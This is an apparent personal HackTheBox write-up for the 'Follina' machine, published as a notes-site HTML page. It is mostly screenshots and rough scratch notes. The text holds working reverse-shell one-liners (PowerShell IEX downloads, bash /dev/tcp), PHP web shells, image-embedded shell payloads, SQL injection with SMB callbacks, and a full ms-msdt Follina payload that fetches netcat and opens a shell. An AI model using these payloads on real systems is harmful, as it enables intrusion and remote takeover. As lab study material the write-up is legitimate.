@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Follina · the-grizzly-bear</title>
+<meta name="description" content="Follina — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-machines/follina.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
+<h1 id="title">Follina</h1>
+
+<p>I paste a bit of screenshots here etc, but not everything, or everything I try, also sorry if some are out of order, swapping between windows/tabs etc</p>
+<p class="figure"><a class="img-link" href="follina/untitled.png"><img src="follina/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-1.png"><img src="follina/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-2.png"><img src="follina/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-3.png"><img src="follina/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-4.png"><img src="follina/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-5.png"><img src="follina/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-6.png"><img src="follina/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p>mysqli-&gt;query('SELECT * FROM j...') #1 {main}</p>
+<p>SELECT Password FROM mysql.user WHERE (user like 'admin' )-- ') LIMIT 10</p>
+<p>; EXEC master ..xp_dirtree'\\10.10.14.2\bug'; —</p>
+<p class="figure"><a class="img-link" href="follina/untitled-7.png"><img src="follina/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p>trying somethings</p>
+<pre><code class="language-bash">IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.2 9002</code></pre>
+<pre><code class="language-bash">IEX( IWR [https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1) -UseBasicParsing)</code></pre>
+<pre><code class="language-bash">IEX(IWR http://10.10.14.2:4444/powershell-reverse-shell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.2 7777</code></pre>
+<p>noe of these things doing much</p>
+<p>annnnd find file upload at bottom</p>
+<p class="figure"><a class="img-link" href="follina/untitled-8.png"><img src="follina/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p>not getting anywhere here atm, checking other things</p>
+<p><a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/ldap-rootdse.html</a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-9.png"><img src="follina/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-10.png"><img src="follina/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-11.png"><img src="follina/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<p>ldapServiceName: friedfollina.htb:dc$@FRIEDFOLLINA.HTB</p>
+<p class="figure"><a class="img-link" href="follina/untitled-12.png"><img src="follina/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<p>ms03-026</p>
+<p class="figure"><a class="img-link" href="follina/untitled-13.png"><img src="follina/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://book.hacktricks.xyz/welcome/readme" target="_blank" rel="noopener">https://book.hacktricks.xyz/welcome/readme</a></p>
+<pre><code class="language-bash">enum4linux -u "" -p "" 10.129.227.209 &amp;&amp; enum4linux -u "guest" -p "" 10.129.227.209</code></pre>
+<p class="figure"><a class="img-link" href="follina/untitled-14.png"><img src="follina/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">smbmap -u "" -p "" -P 445 -H 10.129.227.209 &amp;&amp; smbmap -u "guest" -p "" -P 445 -H 10.129.227.209</code></pre>
+<p class="figure"><a class="img-link" href="follina/untitled-15.png"><img src="follina/untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">smbclient -U '%' -L [//10.129.227.209](https://10.129.227.209/) &amp;&amp; smbclient -U 'guest%' -L //</code></pre>
+<p class="figure"><a class="img-link" href="follina/untitled-16.png"><img src="follina/untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">nmap -n -sV --script "ldap* and not brute" -p 389 10.129.227.209</code></pre>
+<p class="figure"><a class="img-link" href="follina/untitled-17.png"><img src="follina/untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-18.png"><img src="follina/untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-19.png"><img src="follina/untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-20.png"><img src="follina/untitled-20.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-21.png"><img src="follina/untitled-21.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-c">connection.search(search_base='DC=ForestDnsZones,DC=friedfollina,DC=htb', search_filter='(&amp;(objectClass=))', search_scope='SUBTREE', attributes='')
+True
+connection.entries</code></pre>
+<pre><code class="language-c">connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&amp;(objectClass=))', search_scope='SUBTREE', attributes='')
+True
+connection.entries</code></pre>
+<pre><code class="language-c">connection.search(search_base='DC=friedfollina,DC=htb', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='userPassword')
+Trueconnection.entries</code></pre>
+<pre><code class="language-c">connection.search(search_base='CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=friedfollina,DC=htb', search_filter='(&amp;(objectClass=*))', search_scope='SUBTREE', attributes='*')</code></pre>
+<pre><code class="language-c">Naming contexts:
+DC=friedfollina,DC=htb
+CN=Configuration,DC=friedfollina,DC=htb
+CN=Schema,CN=Configuration,DC=friedfollina,DC=htb
+DC=DomainDnsZones,DC=friedfollina,DC=htb
+DC=ForestDnsZones,DC=friedfollina,DC=htb</code></pre>
+<pre><code class="language-c">import ldap3
+server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
+connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
+connection.bind()
+True
+connection.extend.standard.who_am_i()
+u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
+connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})</code></pre>
+<p>tried many things, different limits, fields, etc, but none of the sql injection stuff was leading to any success so far…</p>
+<p>rerunning scan for directory because i kept seeing new things here or there, like</p>
+<p><a href="http://10.129.227.209/apply.php?id=1" target="_blank" rel="noopener">http://10.129.227.209/apply.php?id=1</a></p>
+<p>so wanted to re check, apparently gobuster didnt run or work the first time, lots of stuff</p>
+<p class="figure"><a class="img-link" href="follina/untitled-22.png"><img src="follina/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-23.png"><img src="follina/untitled-23.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-24.png"><img src="follina/untitled-24.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/7777 0&gt;&amp;1'</code></pre>
+<p class="figure"><a class="img-link" href="follina/untitled-25.png"><img src="follina/untitled-25.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-26.png"><img src="follina/untitled-26.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-27.png"><img src="follina/untitled-27.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-28.png"><img src="follina/untitled-28.png" alt="Untitled" loading="lazy"></a></p>
+<p>so only the doc uploaded here no shell, and it was deleted after some time</p>
+<p class="figure"><a class="img-link" href="follina/untitled-29.png"><img src="follina/untitled-29.png" alt="Untitled" loading="lazy"></a></p>
+<p>ole tools and rtfduimp no yields on the other files</p>
+<p>onlythings did was catting them</p>
+<p class="figure"><a class="img-link" href="follina/untitled-30.png"><img src="follina/untitled-30.png" alt="Untitled" loading="lazy"></a></p>
+<p>closing tab so comment here, couldnt get hydra to work on brute forcing this of the other logins, might come back</p>
+<p><a href="http://friedfollina.htb/Admin/" target="_blank" rel="noopener">http://friedfollina.htb/Admin/</a></p>
+<p>pivot to try code execution in image</p>
+<p class="figure"><a class="img-link" href="follina/untitled-31.png"><img src="follina/untitled-31.png" alt="Untitled" loading="lazy"></a></p>
+<p>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/7777 0&gt;&amp;1'</p>
+<p class="figure"><a class="img-link" href="follina/untitled-32.png"><img src="follina/untitled-32.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-33.png"><img src="follina/untitled-33.png" alt="Untitled" loading="lazy"></a></p>
+<p>trying uploads, commands etc</p>
+<p>&lt;?php system([cmd]); ?&gt;</p>
+<p>tried burp repeater but it was cluncky with the redirect and new file names</p>
+<p><a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/List_of_file_signatures</a></p>
+<pre><code class="language-bash">&lt;? eval($_GET['cmd']); ?&gt;
+
+&lt;? system($_GET['cmd']); ?&gt;
+
+&lt;? preg_replace('/.*/e',$_POST['code']); ?&gt;</code></pre>
+<p>git clone <a href="https://github.com/chinarulezzz/pixload.git" target="_blank" rel="noopener">https://github.com/chinarulezzz/pixload.git</a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-34.png"><img src="follina/untitled-34.png" alt="Untitled" loading="lazy"></a></p>
+<p>still nothing</p>
+<p class="figure"><a class="img-link" href="follina/untitled-35.png"><img src="follina/untitled-35.png" alt="Untitled" loading="lazy"></a></p>
+<p>SOME SUCCESS WHOo</p>
+<p class="figure"><a class="img-link" href="follina/untitled-36.png"><img src="follina/untitled-36.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-c">cmd=bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.2/9999 0&gt;&amp;1”</code></pre>
+<p>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/7777 0&gt;&amp;1'</p>
+<p>have noticed, after some uploads, this thing seems to break for a while</p>
+<p class="figure"><a class="img-link" href="follina/untitled-37.png"><img src="follina/untitled-37.png" alt="Untitled" loading="lazy"></a></p>
+<p>well, trying again, dont get the same error result for the jpg with the same shell 😐</p>
+<p>breaktime</p>
+<p><a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/" target="_blank" rel="noopener">https://flast101.github.io/php-8.1.0-dev-backdoor-rce/</a></p>
+<p><a href="https://www.exploit-db.com/exploits/49933" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49933</a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-38.png"><img src="follina/untitled-38.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py" target="_blank" rel="noopener">https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py</a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-39.png"><img src="follina/untitled-39.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-40.png"><img src="follina/untitled-40.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh" target="_blank" rel="noopener">https://github.com/CalegariMindSec/Exploit-PHP-8.1.0/blob/master/php_8.1_rce.sh</a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-41.png"><img src="follina/untitled-41.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://github.com/guardrailsio/awesome-php-security" target="_blank" rel="noopener">https://github.com/guardrailsio/awesome-php-security</a></p>
+<p><a href="https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit" target="_blank" rel="noopener">https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit</a></p>
+<p><a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=74&amp;amp;product_id=128&amp;amp;version_id=0&amp;amp;page=1&amp;amp;hasexp=0&amp;amp;opdos=0&amp;amp;opec=0&amp;amp;opov=0&amp;amp;opcsrf=0&amp;amp;opgpriv=0&amp;amp;opsqli=0&amp;amp;opxss=0&amp;amp;opdirt=0&amp;amp;opmemc=0&amp;amp;ophttprs=0&amp;amp;opbyp=0&amp;amp;opfileinc=0&amp;amp;opginf=0&amp;amp;cvssscoremin=0&amp;amp;cvssscoremax=0&amp;amp;year=0&amp;amp;cweid=0&amp;amp;order=1&amp;amp;trc=604&amp;amp;sha=d8a9f07b702ae6252893a7ef73f2f2812bbcbb8a" target="_blank" rel="noopener">https://www.cvedetails.com/vulnerability-list.php?vendor_id=74&amp;product_id=128&amp;version_id=0&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;cweid=0&amp;order=1&amp;trc=604&amp;sha=d8a9f07b702ae6252893a7ef73f2f2812bbcbb8a</a></p>
+<p><a href="https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md" target="_blank" rel="noopener">https://github.com/CFandR-github/PHP-binary-bugs/blob/main/cve_2022_31626_remote_exploit/cve_writeup.md</a></p>
+<p><a href="https://twitter.com/search?q=CVE-2022-31626&amp;amp;src=typed_query" target="_blank" rel="noopener">https://twitter.com/search?q=CVE-2022-31626&amp;src=typed_query</a></p>
+<p>not thinking this is the vector for a “very easy” box…</p>
+<p class="figure"><a class="img-link" href="follina/untitled-42.png"><img src="follina/untitled-42.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-43.png"><img src="follina/untitled-43.png" alt="Untitled" loading="lazy"></a></p>
+<p>tried re routing to just admin vs admin/admin</p>
+<p>get loldone response….</p>
+<p>hmm eachh time i run through burp it adds an admin</p>
+<p class="figure"><a class="img-link" href="follina/untitled-44.png"><img src="follina/untitled-44.png" alt="Untitled" loading="lazy"></a></p>
+<p>would like to brute force but burte keeps freezing</p>
+<p class="figure"><a class="img-link" href="follina/untitled-45.png"><img src="follina/untitled-45.png" alt="Untitled" loading="lazy"></a></p>
+<p>idk i hope  i have it set right</p>
+<p>might refocus here</p>
+<p>username of course, and i glazed over it beflore without thinking about it, username is follina</p>
+<p class="figure"><a class="img-link" href="follina/untitled-46.png"><img src="follina/untitled-46.png" alt="Untitled" loading="lazy"></a></p>
+<p>'SELECT * FROM job WHERE id = 1 OR LOAD_FILE(CONCAAT("\\\\10.10.14.2\bug\\', VERSION()))</p>
+<p class="figure"><a class="img-link" href="follina/untitled-47.png"><img src="follina/untitled-47.png" alt="Untitled" loading="lazy"></a></p>
+<p>Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM job WHERE id = 1 OR LOAD_FILE(CONCAAT("\\\\10.10.14.2\bug\\', V...' at line 1 in C:\Users\follina\Desktop\xampp\htdocs\search.php:63 Stack trace: #0 C:\Users\follina\Desktop\xampp\htdocs\search.php(63): mysqli-&gt;query('SELECT * FROM j...') #1 {main} thrown in C:\Users\follina\Desktop\xampp\htdocs\search.php on line 63</p>
+<p>it ate</p>
+<p>SELECT * FROM jobs; LOAD_FILE(CONCAAT("\\\\10.10.14.2\bug\\", VERSION())) LIMIT 10</p>
+<p>using sql map on some of the php locations</p>
+<p class="figure"><a class="img-link" href="follina/untitled-48.png"><img src="follina/untitled-48.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-49.png"><img src="follina/untitled-49.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-50.png"><img src="follina/untitled-50.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-51.png"><img src="follina/untitled-51.png" alt="Untitled" loading="lazy"></a></p>
+<p>trying infor from the created users</p>
+<p class="figure"><a class="img-link" href="follina/untitled-52.png"><img src="follina/untitled-52.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-53.png"><img src="follina/untitled-53.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/" target="_blank" rel="noopener">https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/</a></p>
+<p>names of form data</p>
+<p>POST /adduser.php HTTP/1.1<br>
+Host: 10.129.221.91<br>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0<br>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>
+Accept-Language: en-US,en;q=0.5<br>
+Accept-Encoding: gzip, deflate<br>
+Content-Type: multipart/form-data; boundary=---------------------------18080746686485647821948853050<br>
+Content-Length: 12851<br>
+Origin: <a href="http://10.129.221.91/" target="_blank" rel="noopener">http://10.129.221.91</a><br>
+DNT: 1<br>
+Connection: close<br>
+Referer: <a href="http://10.129.221.91/register-candidates.php" target="_blank" rel="noopener">http://10.129.221.91/register-candidates.php</a><br>
+Cookie: PHPSESSID=elcbi9s0olpl5i0447kp7pgb5q<br>
+Upgrade-Insecure-Requests: 1<br>
+Sec-GPC: 1</p>
+<ul><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="fname"</li></ul>
+<p>a4<br>
+-----------------------------18080746686485647821948853050<br>
+Content-Disposition: form-data; name="lname"</p>
+<p>a4<br>
+-----------------------------18080746686485647821948853050<br>
+Content-Disposition: form-data; name="email"</p>
+<p><a href="mailto:a4@test.com">a4@test.com</a><br>
+-----------------------------18080746686485647821948853050<br>
+Content-Disposition: form-data; name="aboutme"</p>
+<p>a4<br>
+-----------------------------18080746686485647821948853050<br>
+Content-Disposition: form-data; name="dob"</p>
+<ul><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="age"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="passingyear"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="qualification"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="stream"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="password"</li></ul>
+<p>a4<br>
+-----------------------------18080746686485647821948853050<br>
+Content-Disposition: form-data; name="cpassword"</p>
+<p>a4<br>
+-----------------------------18080746686485647821948853050<br>
+Content-Disposition: form-data; name="contactno"</p>
+<ul><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="address"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="city"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="state"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="skills"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="designation"</li><li>----------------------------18080746686485647821948853050<br>Content-Disposition: form-data; name="resume"; filename="follina.doc"<br>Content-Type: application/msword</li></ul>
+<p class="figure"><a class="img-link" href="follina/untitled-54.png"><img src="follina/untitled-54.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-55.png"><img src="follina/untitled-55.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-56.png"><img src="follina/untitled-56.png" alt="Untitled" loading="lazy"></a></p>
+<p>tried quickly uploading then applying to submit resume doc</p>
+<p><a href="http://10.129.221.91/user/deactivate-account.php" target="_blank" rel="noopener">http://10.129.221.91/user/deactivate-account.php</a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-57.png"><img src="follina/untitled-57.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-58.png"><img src="follina/untitled-58.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://app.notion.com" target="_blank" rel="noopener">https://app.notion.com</a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-59.png"><img src="follina/untitled-59.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://github.com/dlegs/php-jpeg-injector" target="_blank" rel="noopener">https://github.com/dlegs/php-jpeg-injector</a></p>
+<p><a href="https://www.secjuice.com/htb-magic-walkthrough/" target="_blank" rel="noopener">https://www.secjuice.com/htb-magic-walkthrough/</a></p>
+<p><code>exiftool -DocumentName="&lt;h1&gt;in7rud3r&lt;br&gt;&lt;?php if(isset(\$_REQUEST['cmd'])){echo '&lt;pre&gt;';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '&lt;/pre&gt;';} __halt_compiler();?&gt;&lt;/h1&gt;" image.jpeg</code></p>
+<p><code>exiftool -DocumentName="&lt;?php exec(\"/bin/bash -c 'bash -i &gt; /dev/tcp/10.10.15.126/4444 0&gt;&amp;1'\"); ?&gt;" image.jpeg</code></p>
+<p>└──╼ [★]$ sqlmap -u "<a href="http://10.129.227.209/view-job-post.php?id=1*" target="_blank" rel="noopener">http://10.129.227.209/view-job-post.php?id=1*</a>"</p>
+<p class="figure"><a class="img-link" href="follina/untitled-60.png"><img src="follina/untitled-60.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="https://github.com/Al1ex/CVE-2021-27928" target="_blank" rel="noopener">https://github.com/Al1ex/CVE-2021-27928</a></p>
+<p>no repsone for this one</p>
+<p class="figure"><a class="img-link" href="follina/untitled-61.png"><img src="follina/untitled-61.png" alt="Untitled" loading="lazy"></a></p>
+<p>so just still throwing around sql not getting anything different</p>
+<p>took the payload from</p>
+<p><a href="https://github.com/JohnHammond/msdt-follina/blob/main/follina.py" target="_blank" rel="noopener">https://github.com/JohnHammond/msdt-follina/blob/main/follina.py</a></p>
+<p>used it in</p>
+<p><a href="https://gist.github.com/tothi/66290a42896a97920055e50128c9f040" target="_blank" rel="noopener">https://gist.github.com/tothi/66290a42896a97920055e50128c9f040</a></p>
+<p>opened doc as zip, changed ext</p>
+<p class="figure"><a class="img-link" href="follina/untitled-62.png"><img src="follina/untitled-62.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-63.png"><img src="follina/untitled-63.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-64.png"><img src="follina/untitled-64.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-65.png"><img src="follina/untitled-65.png" alt="Untitled" loading="lazy"></a></p>
+<p>the payload that worked in exploit.html</p>
+<p>&lt;script&gt;location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\"";<br>
+&lt;/script&gt;</p>
+<p class="figure"><a class="img-link" href="follina/untitled-66.png"><img src="follina/untitled-66.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="follina/untitled-67.png"><img src="follina/untitled-67.png" alt="Untitled" loading="lazy"></a></p>
+<p>C:\Users\Administrator\Desktop&gt;type flag.txt<br>
+type flag.txt<br>
+8d2cdcad1c7b93e03408af589be34a45</p>
+<p class="figure"><a class="img-link" href="follina/untitled-68.png"><img src="follina/untitled-68.png" alt="Untitled" loading="lazy"></a></p>
+<p>Invoke-WebRequest <a href="https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true" target="_blank" rel="noopener">https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true</a> -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe 10.10.14.2 1337 b64 encoded</p>
+<p>other scratch notes from the payload</p>
+<pre><code class="language-bash">html_payload = f"""&lt;script&gt;location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""</code></pre>
+<pre><code>    command = f"""Invoke-WebRequest &lt;https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true&gt; -OutFile C:\\\\Windows\\\\Tasks\\\\nc.exe; C:\\\\Windows\\\\Tasks\\\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+</code></pre>
+<pre><code class="language-bash">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9naXRodWIuY29tL0pvaG5IYW1tb25kL21zZHQtZm9sbGluYS9ibG9iL21haW4vbmM2NC5leGU/cmF3PXRydWUgLU91dEZpbGUgQzpcXFdpbmRvd3NcXFRhc2tzXFxuYy5leGU7IEM6XFxXaW5kb3dzXFxUYXNrc1xcbmMuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTQuMiAxMzM3'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""; //"""
+trying this</code></pre>
